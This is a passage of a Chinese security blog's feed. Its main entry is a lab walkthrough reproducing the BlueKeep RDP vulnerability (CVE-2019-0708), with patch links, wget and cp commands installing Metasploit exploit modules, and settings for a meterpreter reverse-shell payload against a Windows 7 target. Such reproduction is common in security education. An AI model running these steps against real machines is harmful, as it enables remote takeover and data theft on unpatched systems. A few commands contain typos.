      &lt;h1 id=&quot;CVE-2019-0232漏洞复现&quot;&gt;&lt;a href=&quot;#CVE-2019-0232漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;CVE-2019-0232漏洞复现&quot;&gt;&lt;/a&gt;CVE-2019-0232漏洞复现&lt;/h1&gt;&lt;h4 id=&quot;1、漏洞背景：&quot;&gt;&lt;a href=&quot;#1、漏洞背景：&quot; class=&quot;headerlink&quot; title=&quot;1、漏洞背景：&quot;&gt;&lt;/a&gt;1、漏洞背景：&lt;/h4&gt;&lt;p&gt;​    &lt;strong&gt;Apache Tomcat是在Apache Software Foundation (ASF)支持下开发的开源Java  Servlet容器，实现了多个Java EE规范，包括Java Servlet, JavaServer Pages (JSP), Java  Expression Language (EL), WebSocket，提供一个Java代码运行的纯Java HTTP web服务器环境。&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞利用" scheme="http://msxl.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
      <category term="Web" scheme="http://msxl.github.io/tags/Web/"/>
    
      <category term="tomcat" scheme="http://msxl.github.io/tags/tomcat/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708漏洞复现</title>
    <link href="http://msxl.github.io/2019/09/09/CVE-2019-0708%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://msxl.github.io/2019/09/09/CVE-2019-0708%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2019-09-09T07:46:03.000Z</published>
    <updated>2020-04-29T07:20:46.652Z</updated>
    
    <content type="html"><![CDATA[<h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍:"></a>漏洞介绍:</h3><p>​    Windows再次被曝出一个破坏力巨大的高危远程漏洞CVE-2019-0708。CVE-2019-0708是RDP协议的安全漏洞，具有蠕虫功能，因此 危害很大。攻击者一旦成功利用该漏洞，便可以在目标系统上执行任意代码，包括获取敏感信息、执行远程代码、发起拒绝服务攻击等等攻击行为。    </p><a id="more"></a><p>​    受影响的操作系统有：</p><p>​        · Windows 2003</p><p>​        · Windows XP</p><p>​        · Windows 7</p><p>​        · Windows Server 2008</p><p>​        ·Windows Server 2008 R2</p><h3 id="各个版本补丁下载："><a href="#各个版本补丁下载：" class="headerlink" title="各个版本补丁下载："></a>各个版本补丁下载：</h3><h4 id="1-Windows-Server-2003-漏洞补丁系列下载地址"><a href="#1-Windows-Server-2003-漏洞补丁系列下载地址" class="headerlink" title="1.Windows Server 2003 漏洞补丁系列下载地址"></a>1.<strong>Windows Server 2003 漏洞补丁系列下载地址</strong></h4><p>​    Windows Server 2003 32位系统:</p><p>​    <a href="http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x86-custom-chs_4892823f525d9d532ed3ae36fc440338d2b46a72.exe" target="_blank" rel="noopener">http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x86-custom-chs_4892823f525d9d532ed3ae36fc440338d2b46a72.exe</a></p><p>​    Windows Server 2003 64位系统:</p><p>​    <a href="http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-chs_f2f949a9a764ff93ea13095a0aca1fc507320d3c.exe" target="_blank" rel="noopener">http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-chs_f2f949a9a764ff93ea13095a0aca1fc507320d3c.exe</a></p><h4 id="2-Windows-XP-漏洞补丁系列下载地址："><a href="#2-Windows-XP-漏洞补丁系列下载地址：" class="headerlink" title="2.Windows XP 漏洞补丁系列下载地址："></a>2.Windows XP 漏洞补丁系列下载地址：</h4><p>​    Windows XP SP3 32位系统:</p><p>​    <a href="http://download.windowsupdate.com/c/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-custom-chs_718543e86e06b08b568826ac13c05f967392238c.exe" target="_blank" rel="noopener">http://download.windowsupdate.com/c/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-custom-chs_718543e86e06b08b568826ac13c05f967392238c.exe</a></p><p>​    Windows XP SP2 64位系统:</p><p>​    <a href="http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-enu_e2fd240c402134839cfa22227b11a5ec80ddafcf.exe" target="_blank" rel="noopener">http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-enu_e2fd240c402134839cfa22227b11a5ec80ddafcf.exe</a></p><p>​    Windows XP SP3 for XPe:</p><p><a href="http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-embedded-custom-chs_96da48aaa9d9bcfe6cd820f239db2fe96500bfae.exe" target="_blank" rel="noopener">http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-embedded-custom-chs_96da48aaa9d9bcfe6cd820f239db2fe96500bfae.exe</a></p><h4 id="3-Windows-Server-2008-漏洞补丁系列下载地址"><a href="#3-Windows-Server-2008-漏洞补丁系列下载地址" class="headerlink" title="3.Windows Server 2008 漏洞补丁系列下载地址"></a>3.Windows Server 2008 漏洞补丁系列下载地址</h4><p>​    Windows Server 2008 32位系统:</p><p>​    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x86_832cf179b302b861c83f2a92acc5e2a152405377.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x86_832cf179b302b861c83f2a92acc5e2a152405377.msu</a></p><p>​    Windows Server 2008 x64位系统:</p><p>​    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x64_9236b098f7cea864f7638e7d4b77aa8f81f70fd6.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x64_9236b098f7cea864f7638e7d4b77aa8f81f70fd6.msu</a></p><p>​    Windows Server 2008 R2 Itanium系统:</p><p>​    <a href="http://download.windowsupdate.com/c/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-ia64_fabc8e54caa0d31a5abe8a0b347ab4a77aa98c36.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/c/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-ia64_fabc8e54caa0d31a5abe8a0b347ab4a77aa98c36.msu</a></p><p>​    Windows Server 2008 R2 x64系统:</p><p>​    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu</a></p><p>​    Windows Server 2008 Itanium:</p><p>​    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499180-ia64_805e448d48ab8b1401377ab9845f39e1cae836d4.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499180-ia64_805e448d48ab8b1401377ab9845f39e1cae836d4.msu</a></p><h4 id="4-Windows-7-漏洞补丁系列下载地址："><a href="#4-Windows-7-漏洞补丁系列下载地址：" class="headerlink" title="4.Windows 7 漏洞补丁系列下载地址："></a>4.Windows 7 漏洞补丁系列下载地址：</h4><p>​    Windows 7 x86系统：</p><p>​    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x86_6f1319c32d5bc4caf2058ae8ff40789ab10bf41b.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x86_6f1319c32d5bc4caf2058ae8ff40789ab10bf41b.msu</a></p><p>​    Windows 7 x64系统：</p><p>​    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu</a></p><p>​     Windows Embedded Standard 7  x86系统：</p><p>​    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x86_6f1319c32d5bc4caf2058ae8ff40789ab10bf41b.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x86_6f1319c32d5bc4caf2058ae8ff40789ab10bf41b.msu</a></p><pre><code>Windows Embedded Standard 7  x64系统：</code></pre><p>​    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/pciclearstalecache_d243a607b50db10ed50f03cff570498018c61a59.exe" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/pciclearstalecache_d243a607b50db10ed50f03cff570498018c61a59.exe</a></p><h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">攻击机：Kali Linux 2019.03版</span><br><span class="line"></span><br><span class="line">攻击机IP：192.168.180.150</span><br><span class="line"></span><br><span class="line">靶机：Windows 7 SP1(6.1.7601)</span><br><span class="line"></span><br><span class="line">靶机IP：192.168.180.147</span><br></pre></td></tr></table></figure><h3 id="导入MSF攻击模块"><a href="#导入MSF攻击模块" class="headerlink" title="导入MSF攻击模块"></a>导入MSF攻击模块</h3><h4 id="手动下载加入模块"><a href="#手动下载加入模块" class="headerlink" title="手动下载加入模块"></a><strong>手动下载加入模块</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cve_2019_0708_bluekeep_rce.rb 添加 /usr/share/metasploit-framework/modules/exploit/windows/rdp/</span><br><span class="line"></span><br><span class="line">rdp.rb 替换 /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb</span><br><span class="line"></span><br><span class="line">rdp_scanner.rb 替换 /usr/share//metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line"></span><br><span class="line">cve_2019_0708_bluekeep.rb 替换 /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br></pre></td></tr></table></figure><h4 id="Kali下载加入模块"><a href="#Kali下载加入模块" class="headerlink" title="Kali下载加入模块"></a><strong>Kali下载加入模块</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line"></span><br><span class="line">cp rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/</span><br><span class="line"></span><br><span class="line">cp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/</span><br><span class="line"></span><br><span class="line">cp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/</span><br><span class="line"></span><br><span class="line">cp cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/</span><br></pre></td></tr></table></figure><h4 id="如果出现以下情况（请更新metasploit）"><a href="#如果出现以下情况（请更新metasploit）" class="headerlink" title="如果出现以下情况（请更新metasploit）:"></a>如果出现以下情况（请更新metasploit）:</h4><img src="/2019/09/09/CVE-2019-0708漏洞复现/2.png" title="avatar"><h4 id="打开sources-list文件将下面的源复制到文件中"><a href="#打开sources-list文件将下面的源复制到文件中" class="headerlink" title="打开sources.list文件将下面的源复制到文件中"></a>打开sources.list文件将下面的源复制到文件中</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leafpad /etc/apt/sources.list</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#中科大deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">#阿里云deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#清华大学deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#浙大deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-freedeb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#东软大学deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contribdeb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">#官方源deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><h4 id="保存之后执行"><a href="#保存之后执行" class="headerlink" title="保存之后执行"></a>保存之后执行</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get  install metasploit-framework</span><br></pre></td></tr></table></figure><h4 id="然后重新将模块导入（更新后的metasploit在-opt目录下）"><a href="#然后重新将模块导入（更新后的metasploit在-opt目录下）" class="headerlink" title="然后重新将模块导入（更新后的metasploit在/opt目录下）"></a>然后重新将模块导入（更新后的metasploit在/opt目录下）</h4><h4 id="rdp-rb-gt"><a href="#rdp-rb-gt" class="headerlink" title="rdp.rb -&gt;"></a>rdp.rb -&gt;</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp rdp.rd /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb</span><br></pre></td></tr></table></figure><h4 id="rdp-scanner-rb-gt"><a href="#rdp-scanner-rb-gt" class="headerlink" title="rdp_scanner.rb -&gt;"></a>rdp_scanner.rb -&gt;</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdp_scanner.rb /opt/Metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br></pre></td></tr></table></figure><h4 id="cve-2019-0708-bluekeep-rb-gt"><a href="#cve-2019-0708-bluekeep-rb-gt" class="headerlink" title="cve_2019_0708_bluekeep.rb -&gt;"></a>cve_2019_0708_bluekeep.rb -&gt;</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp cve_2019_0708_bluekeep.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br></pre></td></tr></table></figure><h4 id="cve-2019-0708-bluekeep-rce-rb-gt"><a href="#cve-2019-0708-bluekeep-rce-rb-gt" class="headerlink" title="cve_2019_0708_bluekeep_rce.rb -&gt;"></a>cve_2019_0708_bluekeep_rce.rb -&gt;</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp cve_2019_0708_bluekeep.rb /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure><h4 id="下面两个命令如果没有rdp目录，就用mkdir创建一个rdp目录："><a href="#下面两个命令如果没有rdp目录，就用mkdir创建一个rdp目录：" class="headerlink" title="下面两个命令如果没有rdp目录，就用mkdir创建一个rdp目录："></a>下面两个命令如果没有rdp目录，就用mkdir创建一个rdp目录：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/</span><br><span class="line"></span><br><span class="line">mkdir -p /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/</span><br></pre></td></tr></table></figure><h4 id="实验步骤："><a href="#实验步骤：" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h5 id="msf操作"><a href="#msf操作" class="headerlink" title="msf操作"></a>msf操作</h5><img src="/2019/09/09/CVE-2019-0708漏洞复现/4.png" title="avatar"><ul><li>LHOST 攻击机IP地址(set LHOST IP)</li><li>RHOSTS 靶机IP地址(set RHOSTS IP)</li><li>Target 攻击选项(使用info命令可以查看到targets)(set targets 1-4)</li><li>Payloads 攻击载荷(set payload windows/x64/meterpreter/reverse_tcp)</li></ul><h4 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h4><h5 id="Target-这里可以用show-targets查看选项，以下有四个第三个蓝屏的几率很大，我这里用的第一个。"><a href="#Target-这里可以用show-targets查看选项，以下有四个第三个蓝屏的几率很大，我这里用的第一个。" class="headerlink" title="Target 这里可以用show targets查看选项，以下有四个第三个蓝屏的几率很大，我这里用的第一个。"></a>Target 这里可以用show targets查看选项，以下有四个第三个蓝屏的几率很大，我这里用的第一个。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show targets#查看</span><br></pre></td></tr></table></figure><h5 id="payload-这里如果不进行设置的话，就不会返回Meterpreter-shell的链接"><a href="#payload-这里如果不进行设置的话，就不会返回Meterpreter-shell的链接" class="headerlink" title="payload 这里如果不进行设置的话，就不会返回Meterpreter shell的链接"></a>payload 这里如果不进行设置的话，就不会返回Meterpreter shell的链接</h5><p>​    Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><h4 id="攻击结果："><a href="#攻击结果：" class="headerlink" title="攻击结果："></a>攻击结果：</h4><img src="/2019/09/09/CVE-2019-0708漏洞复现/5.png" title="avatar"><p>​     以上就是运用CVE2019-0708漏洞的一次入侵过程复现，不要以为这么顺风顺水，这其中还有很多的情况，比如下图的蓝屏等情况 ，多试几次就可以了。</p><p>​    这种EXP尚不稳定，实战中没法真正的去用。 </p><img src="/2019/09/09/CVE-2019-0708漏洞复现/1.png" title="avatar"><p>有兴趣的可以按照上面的步骤进行操作，有不懂的可以联系我。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍:&quot;&gt;&lt;/a&gt;漏洞介绍:&lt;/h3&gt;&lt;p&gt;​    Windows再次被曝出一个破坏力巨大的高危远程漏洞CVE-2019-0708。CVE-2019-0708是RDP协议的安全漏洞，具有蠕虫功能，因此 危害很大。攻击者一旦成功利用该漏洞，便可以在目标系统上执行任意代码，包括获取敏感信息、执行远程代码、发起拒绝服务攻击等等攻击行为。    &lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://msxl.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Metasploit" scheme="http://msxl.github.io/tags/Metasploit/"/>
    
      <category term="Windows" scheme="http://msxl.github.io/tags/Windows/"/>
    
      <category term="kali" scheme="http://msxl.github.io/tags/kali/"/>
    
  </entry>
  
</feed>
